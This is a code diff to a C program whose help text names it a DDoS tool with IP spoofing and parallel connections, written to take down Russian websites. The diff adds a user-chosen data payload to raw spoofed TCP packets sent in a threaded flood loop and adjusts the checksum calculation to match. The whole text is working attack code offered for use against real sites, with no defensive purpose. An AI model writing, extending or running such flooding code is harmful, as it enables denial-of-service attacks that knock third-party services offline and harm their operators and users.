@@ -22,10 +22,13 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 
+#define PAYLOAD_LEN 2048
+#define DEF_PAYLOAD "GET / HTTP/1.1\r\n\r\n"
 // get a random byte
 #define RANDB (rand() & 0xFF)
 // get a random word
 #define RANDW (rand() & 0xFFFF)
+
 
 // pseudo header needed for checksum calculation
 struct ippseudo
@@ -42,13 +45,15 @@ struct tcp_pkt
 {
 	struct iphdr tp_iphdr;
 	struct tcphdr tp_tcphdr;
+	char tp_payload[PAYLOAD_LEN];
 };
 
 // pseudo TCP packet
 struct pseudo_tcp_pkt
 {
 	struct ippseudo ptp_ipps;
-	struct tcphdr ptp_tcphdt;
+	struct tcphdr ptp_tcphdr;
+	char ptp_payload[PAYLOAD_LEN];
 };
 
 // connection configuration
@@ -60,6 +65,7 @@ struct conn_conf
 };
 
 char *dst_addr;
+char *payload = NULL;
 uint16_t dst_port = 80;
 size_t ncon = 1;
 size_t npac = 0;
@@ -133,7 +139,8 @@ static uint16_t chksum(uint16_t *data, size_t len)
 }
 
 // initialize a TCP connection with spoofed IP
-static int init_conn(struct conn_conf *con, in_addr_t dst_addr, in_port_t dst_port)
+static int init_conn(struct conn_conf *con, in_addr_t dst_addr, 
+		in_port_t dst_port, const char *pl)
 {
 	int sock;
 	struct sockaddr_in sin;
@@ -145,6 +152,9 @@ static int init_conn(struct conn_conf *con, in_addr_t dst_addr, in_port_t dst_po
 		return -1;
 	}
 
+	// copy payload
+	strcpy(con->cc_tcp_pkt.tp_payload, pl);
+
 	// socket
 	sin.sin_family = AF_INET;
 	sin.sin_port = htons(dst_port);
@@ -154,7 +164,7 @@ static int init_conn(struct conn_conf *con, in_addr_t dst_addr, in_port_t dst_po
 	pkt.tp_iphdr.ihl = 5;
 	pkt.tp_iphdr.version = 4;
 	pkt.tp_iphdr.tos = 0;
-	pkt.tp_iphdr.tot_len = sizeof(struct tcp_pkt);
+	pkt.tp_iphdr.tot_len = sizeof(struct tcp_pkt) - (PAYLOAD_LEN - strlen(pl));
 	pkt.tp_iphdr.id = htonl(54321);
 	pkt.tp_iphdr.frag_off = 0;
 	pkt.tp_iphdr.ttl = 255;
@@ -191,11 +201,13 @@ static int init_conn(struct conn_conf *con, in_addr_t dst_addr, in_port_t dst_po
 	// pseudo TCP packet
 	struct pseudo_tcp_pkt ppkt = {
 		.ptp_ipps = ipps,
-		.ptp_tcphdt = pkt.tp_tcphdr
+		.ptp_tcphdr = pkt.tp_tcphdr,
 	};
+	strcpy(ppkt.ptp_payload, pkt.tp_payload);
+	size_t len = sizeof(struct pseudo_tcp_pkt) - (PAYLOAD_LEN - strlen(pl));
 
 	// TCP packet checksum
-	pkt.tp_tcphdr.check = chksum((uint16_t *)&ppkt, sizeof(struct pseudo_tcp_pkt));
+	pkt.tp_tcphdr.check = chksum((uint16_t *)&ppkt, len);
 
 	int one = 1;
 	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) {
@@ -231,12 +243,13 @@ static void spoof_pkt(struct conn_conf *con)
 	// pseudo TCP packet
 	struct pseudo_tcp_pkt ppkt = {
 		.ptp_ipps = ipps,
-		.ptp_tcphdt = con->cc_tcp_pkt.tp_tcphdr
+		.ptp_tcphdr = con->cc_tcp_pkt.tp_tcphdr
 	};
+	strcpy(ppkt.ptp_payload, con->cc_tcp_pkt.tp_payload);
+	size_t len = sizeof(struct pseudo_tcp_pkt) - (PAYLOAD_LEN - strlen(ppkt.ptp_payload));
 	
 	// TCP packet checksum
-	con->cc_tcp_pkt.tp_tcphdr.check = chksum(
-		(uint16_t *)&ppkt, sizeof(struct pseudo_tcp_pkt));
+	con->cc_tcp_pkt.tp_tcphdr.check = chksum((uint16_t *)&ppkt, len);
 }
 
 // send packet to its destination
@@ -253,7 +266,7 @@ void *pthread_conn(void *args)
 {
 	// initialize connection
 	struct conn_conf con;
-	init_conn(&con, inet_addr(dst_addr), dst_port);
+	init_conn(&con, inet_addr(dst_addr), dst_port, payload);
 
 	// bombard loop
 	while (1) {
@@ -287,15 +300,16 @@ static void print_help()
 {
  	puts("DDoS tool with IP spoofing and parallel connections");
  	puts("to bring russian orc websites to their knees\n");
- 	puts("by ishiki, 2022\n");
+ 	puts("\tby ishiki, 2022\n");
  	puts("usage: sudo ./bombard <options>");
- 	puts("-a <address>\t: destination IP address");
- 	puts("-u <host url>\t: destination URL");
- 	puts("-p <port>\t: destination port number");
- 	puts("-c <num>\t: number of connections");
- 	puts("-d <num>\t: duration of attack (in seconds)");
- 	puts("-n <num>\t: number of packets to send");
- 	puts("-h\t\t: print help message");
+ 	puts("\t-a <address>\t: destination IP address");
+ 	puts("\t-u <host url>\t: destination URL");
+ 	puts("\t-p <port>\t: destination port number");
+ 	puts("\t-l <payload>\t: data payload to send");
+ 	puts("\t-c <num>\t: number of connections");
+ 	puts("\t-d <num>\t: duration of attack (in seconds)");
+ 	puts("\t-n <num>\t: number of packets to send");
+ 	puts("\t-h\t\t: print help message");
 }
 
 int main(int argc, char **argv)
@@ -344,6 +358,9 @@ int main(int argc, char **argv)
 		case 'p': 	// port
 			dst_port = atoi(argv[++i]);
 			break;
+		case 'l': 	//payload
+			payload = argv[++i];
+			break;
 		case 'c': 	//number of connections 
 			ncon = atoi(argv[++i]);
 			break;
@@ -355,7 +372,7 @@ int main(int argc, char **argv)
 			break;
 		case 'h': 	// help
 			print_help();
-			break;
+			return EXIT_SUCCESS;
 		default:
 			printf("error: invalid flag\n");
 			return EXIT_FAILURE;
@@ -363,9 +380,12 @@ int main(int argc, char **argv)
 	}
 
 	if (!ok) {
-		printf("error: destination IP address or host url required");
+		printf("error: destination IP address or host url required/n");
 		return EXIT_FAILURE;
 	}
+
+	if (!payload)
+		payload = DEF_PAYLOAD;
 
 	printf("initializing attack on %s:%u with %lu connection(s)...\n",
 			dst_addr, dst_port, ncon);
